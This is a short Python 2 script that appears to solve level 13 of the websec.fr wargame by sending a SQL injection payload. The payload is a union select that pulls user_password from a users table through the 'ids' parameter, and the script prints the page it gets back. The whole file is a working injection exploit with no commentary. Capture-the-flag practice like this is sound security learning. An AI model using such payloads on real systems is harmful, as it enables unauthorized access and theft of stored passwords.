from requests import * 

url = 'http://websec.fr/level13/index.php'
payload = ',,,)) union select 1,2,user_password from users --'

params = {
    'ids' : payload,
    'submit' : 'Go'
}

r = get(url , params=params)
print r.text
